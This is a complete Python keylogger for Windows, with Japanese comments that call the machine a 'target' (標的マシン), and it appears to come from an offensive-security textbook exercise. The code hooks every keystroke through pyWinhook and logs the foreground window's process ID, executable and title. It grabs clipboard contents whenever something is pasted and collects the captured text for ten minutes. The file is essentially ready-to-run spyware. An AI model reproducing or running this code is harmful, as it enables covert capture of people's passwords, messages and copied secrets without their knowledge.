from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import pythoncom
import pyWinhook as pyHook
import sys
import time 
import win32clipboard

TIMEOUT = 60 * 10

class KeyLogger:
    def __init__(self):
        self.current_window = None
    
    def get_current_process(self):
        # 標的マシンのデスクトップ上でアクティブなウィンドウへのハンドルを返す関数を呼び出す
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        # プロセスIDを所得するため取得したハンドルを使う
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        # プロセスをオープン
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        # 得られたプロセスハンドルを使って実行
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

        window_title = create_string_buffer(512)
        # ウィンドウのタイトルバーの文字列を取得
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')
        # 取得したすべての情報を含んだヘッダーを出力
        print('\n', process_id, executable.value.decode(), self.current_window)
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)
    def mykeystroke(self, event):
        # 利用者がウィンドウを変更したかチェック
        if event.WindowName != self.current_window:
            self.get_current_process()
        # Asciiの印字可能文字範囲内であれば表示
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            # 利用者が貼り付けの処理を行った時の処理
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')
        return True

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()
    # keylogger オブジェクトを作成
    kl = KeyLogger()
    hm = pyHook.HookManager()
    # HookManagerを定義
    hm.KeyDown = kl.mykeystroke
    # pyWinHookに全てのキーボードの押下をフックさせタイムアウトまで実行を継続
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()
    
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

if __name__ == '__main__':
    print(run())
    print('done')